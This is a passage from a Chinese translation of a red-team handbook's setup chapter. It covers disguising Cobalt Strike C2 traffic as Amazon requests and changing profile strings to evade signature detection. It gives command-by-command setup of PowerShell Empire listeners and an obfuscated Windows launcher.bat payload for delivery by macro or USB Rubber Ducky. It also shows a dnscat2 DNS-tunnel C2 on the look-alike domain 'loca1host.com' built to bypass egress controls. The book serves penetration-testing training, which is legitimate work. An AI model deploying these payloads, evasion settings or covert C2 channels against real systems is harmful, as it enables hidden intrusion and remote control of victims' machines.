一些显而易见的信息：
我们可以看出这将会产生带有URI路径的HTTP请求：
set uri “/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books”;
主机 header 设置为 Amazon：
header “Host” “www.amazon.com”;
甚至一些自定义服务器的 header 也从 C2 服务器发回：
header “x-amz-id-1” “THKUYEZKCKPGY5T42PZT”;
header “x-amz-id-2” “a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2t
现在很多红队已经在许多不同的活动中使用了这些配置文件，许多安全厂商已经给所有常见
的自定义配置文件创建了指纹签名。为了解决这个问题，我们能做的是: 确保修改了配置文件
中的所有静态字符串，确保更改了所有 User-Agent 信息，使用真实的证书配置 SSL（不要使
用 Cobalt Strike 默认的 SSL 证书），调整抖动率，并更改客户端的的 beacon 时间。 最后一
个注意事项是确保通过 POST（http-post）命令进行通信，因为如果不这样做可能会导致使用
自定义配置文件时出现很多问题。 如果你的配置文件注明了通过 http-get 进行通信，它仍然
有效，但上传大文件将一直被限制。 请记住，GET 请求通常限制在2048个字符以内。
SpectorOps 安全团队还创建了可定制混淆 C2 配置文件的项目.
译者注: 这个脚本可以将 Cobalt Strike 的配置文件进行混淆来绕过一些基于签名检测的
软件，其原理是将变量替换为提供的字典中的随机字符串，然后输出新的 Malleable C2
配置文件。
Cobalt Strike 的 Aggressor 脚本
Cobalt Strike 项目有很多贡献者。Aggressor 脚本是一种面向红队操作和对手模拟的脚本语
言，其灵感来源于可脚本化的 IRC 客户端和机器人。开发它的目的有两个：
1. 你可以创建长时间运行的机器人来模拟虚拟红队成员，并与你并肩进行黑客攻击
2. 你还可以根据你的需要使用它来扩展和修改 Cobalt Strike 客户端的功能 官方介绍页
面：https://www.cobaltstrike.com/aggressor-script/index.html
28
第1章 赛前准备——安装
例子：HarleyQu1nn 将不同的 Aggressor 脚本放在一个项目中提供给你用于后续漏洞利用：
http://bit.ly/2qxIwPE
PowerShell Empire
Empire 是一个后期漏洞利用的框架，包含一个纯 PowerShell2.0 的 Windows 代理和一个纯
Python 2.6/2.7 的 Linux/OS X 代理。它是以前的 PowerShell Empire 和 Python EmPyre 项目
的合并。 该框架提供了加密安全通信和灵活的架构。在 PowerShell 方面，Empire 实现了无
需 powershell.exe 就可运行 PowerShell 代理的功能。并且 Empire 有很多可以快速部署的后
期漏洞利用模块，从键盘记录器到 Mimikatz。Empire 还可以调整通信，躲避网络检测。所有
的这些功能都封装在一个以实用性为重点的 框架中。
对于红队人员来说，PowerShell 是我们最好的朋友之一。在初始化有效 payload 之后，所有
随后的攻击都保存在内存中。Empire 最好的地方就是它被开发者积极地维护和更新中，以便
你可以使用最新的后期漏洞利用模块进行攻击。 它们还具有适用于 Linux 和 OS X 的 C2 连
接。因此，你仍然可以创建基于 MAC 的 Office 宏，当执行之后，在 Empire 中拥有一个全新
的代理。
我们将通过本书更详细地介绍 Empire，以便你了解它的威力如何。在设置 Empire 方面，确
保你已安全地配置它非常重要：
将证书路径 CertPath 设置为一个真实可信的 SSL 证书。
更改 DefaultProfile 端点。许多第7层防火墙都在寻找确切的静态端点。
更改用于通信的用户代理。
在前两版书中我们提过，Metasploit 的源文件用于自动化，Empire 现在也支持自动运行的脚
本，这样可以提高效率。
运行 Empire：
初始化 Empire
cd /opt/Empire && ./setup/reset.sh
退出
exit
安装证书（最好是使用真实受信任的证书）
./setup/cert.sh
开始运行 Empire
29
第1章 赛前准备——安装
./empire
创建一个监听器
listeners
选择你的监听器类型（我们实验使用的是 HTTP）
uselistener [按两次 tab 键来查阅所有类型的监听器]
uselistener http
查看监听器的全部配置信息
info
设置以下内容（即设置KillDate 12/12/2020）
KillDate - 规定一个结束时间然后自动清理代理
DefaultProfile - 确保更改所有端点（即/admin/get.php,/news.php）。你可以根据需要制作它们，例如/s
eriously/notmalware.php
DefaultProfile - 确保也更改你的用户代理。 我一般是查看使用过的顶级用户代理并选择从中选择一个。
Host - 更改为通过端口443的 HTTPS
CertPath - 添加 SSL 证书的路径
UserAgent - 将其更改为你的常用用户代理
Port - 设置为443
ServerVersion - 将其更改为另一个常见的服务器 Header
当你完成所有这些，开启你的监听器
execute
30
第1章 赛前准备——安装
配置 Payload
payload 是将在受害者系统上运行的实际恶意软件。 这些 payload 可以在 Windows，Linux
和 OSX 中运行，但 Empire 以其基于 PowerShell Windows 的 Payload 而闻名：
进入主菜单
main
为 OSX，Windows，Linux 创建可用的 stager。 我们将创建一个简单的 bat 文件作为示
例，但实际上你可以为 Office 文件创建宏或者为一个 USB 橡皮鸭创建 payload（译者
注： USB 橡皮鸭/USB RUBBER DUCKY 是最早的按键注入工具）
usestager [按两次tab键来查阅所有不同的类型]
usestager windows/launcher_bat
查看所有设置
info
配置所有 Settings
http 把 Listener 设置为 http
配置 UserAgent(用户代理)
31
第1章 赛前准备——安装
创建 Payload
generate
在另一个终端窗口中查看你的 payload
cat /tmp/launcher.bat
如你所见，创建的 payload 被严重混淆。 你现在可以把这个 .bat 文件丢到任何 Windows 系
统上。 当然，你可能会创建一个 Office 宏文件或一个USB橡皮鸭（注：USB RUBBER
DUCKY/USB 橡皮鸭是最早的按键注入工具）的 payload，但这只是众多示例中的一个。
如果你尚未在 Kali 图形界面上安装 PowerShell，那么最好的方法是手动安装它。 在 Kali 上
安装 PowerShell：
apt-get install libunwind8
wget http://security.debian.org/debian-security/pool/updates/main/o/openssl/libssl1.0.
0_1.0.1t-1+deb7u3_amd64.deb
dpkg -i libssl1.0.0_1.0.1t-1+deb7u3_amd64.deb
wget http://security.ubuntu.com/ubuntu/pool/main/i/icu/libicu55_55.1-7ubuntu0.3_amd64.
deb
dpkg -i libicu55_55.1-7ubuntu0.3_amd64.deb
wget https://github.com/PowerShell/PowerShell/releases/download/v6.0.2/powershell_6.0.
2-1.ubuntu.16.04_amd64.deb
dpkg -i powershell_6.0.2-1.ubuntu.16.04_amd64.deb
dnscat2
32
第1章 赛前准备——安装
内网出口一般对出站流量做了严格限制，但是通常不会限制 DNS 请求，也就是 UDP 53 请
求。dnscat2 就是一款利用 DNS 协议创建加密 C2 隧道来控制服务器的工具，所以说这种隧
道几乎在每个网络中都可以使用。dnscat2 由客户端和服务端两部分组成。
基于 DNS 的 C2 服务器连接的渗透方案提供了一种很好的机制来隐藏你的流量，规避网络传
感器并绕过网络限制。在许多限制性环境或生产环境中，我们遇到的网络要么直接不允许出
站流量，要么流量也会被严格的限制或监控。为了绕过这些保护，我们可以使用像 dnscat2
这样的工具。我们关注 dnscat2 的原因是因为它不需要 root权限就允许shell访问和数据传
输。
在许多安全环境中，直接使用 UDP 或 TCP 出站会受到限制。 为什么不利用基础架构中已经
内置的服务呢？许多受保护的网络包含一个 DNS 服务器来解析内部主机，同时还允许解析外
部资源。通过为我们拥有的恶意域名设置一个权威服务器，我们可以利用这些 DNS 解析来对
我们的恶意软件进行命令执行和控制。
在我们的场景中，我们将设置名为 “loca1host.com” 的攻击者域。 我们希望通过对 “localhost”
创建“分身”来更多地隐藏我们的流量。请你自行将 “loca1host.com” 替换为你拥有的域名。我
们将配置 loca1host.com 的 DNS 信息，使其成为一个权威 DNS 服务器(Authoritative DNS
server)。 在这个例子中，我们将使用 GoDaddy 的 DNS 配置工具，但你也可以换成任何其他
的 DNS 服务。
使用GoDaddy设置一个权威DNS服务器
首先，确保将一台 VPS 服务器设置为你的 C2 攻击服务器并获取了该服务器的 IP。
在 GoDaddy 网站购买域名后，登录你的 GoDaddy（或其他类似的）帐户。
选择你的域，单击“管理”，然后选择“高级 DNS”。
先设置两条 A 记录指向你的 VPS 的 IP
ns1 (然后输入你的VPS的IP)
ns2 (然后输入你的VPS的IP)
33
第1章 赛前准备——安装
然后设置自定义 NS 记录
添加 ns1.loca1host.com
添加 ns2.loca1host.com
如上图所示，我们现在让我们的 NS 记录指向 ns1.loca1host.com 和 ns2.loca1host.com，它
们都指向我们的攻击 VPS 服务器的 IP。 如果你尝试解析 loca1host.com 的任何子域（即
vpn.loca1host.com），它将尝试使用我们的 VPS 进行相关的域名解析。对我们来说幸运的
是，dnscat2 在 UDP 端口53上监听并为我们做了所有繁重的工作。
接下来，我们将需要完全设置充当我们的自定义域名解析服务器的攻击服务器。初始化并设
置 dnscat2 服务器：
sudo su -
apt-get update
apt-get install ruby-dev
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
apt-get install gcc make
gem install bundler
bundle install
请测试确认以下脚本能够正常运行: ruby ./dnscat2.rb
备注: 如果你使用的是 Amazon Lightsail，请确保安全组设置中允许 UDP 端口53
对于客户端的代码，我们需要将其编译为 Linux 支持执行的二进制文件。
编译客户端
git clone https://github.com/iagox86/dnscat2.git /opt/dnscat2/client
cd /opt/dnscat2/client/
make
我们现在应该创建一个 dnscat 二进制文件！